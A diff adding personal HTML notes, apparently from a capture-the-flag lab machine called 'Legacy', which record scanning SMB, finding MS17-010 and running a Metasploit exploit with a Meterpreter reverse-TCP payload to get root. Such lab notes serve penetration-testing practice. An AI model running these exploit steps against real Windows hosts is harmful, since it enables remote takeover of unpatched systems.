@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.10.10.4 Legacy 2</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.10.10.4 Legacy 2</h1><br/><br />nmap showed that the only open port faceing me was smb<br />smbvuln showed me that it may be vulnerable to ms17-010<br />msfconsole<br />use exploit windows/smb/ms17_010_psexec<br />set payload windows/meterpreter/reverse_tcp<br />rhost<br />lhost<br />lport<br />go<br />rooted</div></body></html>
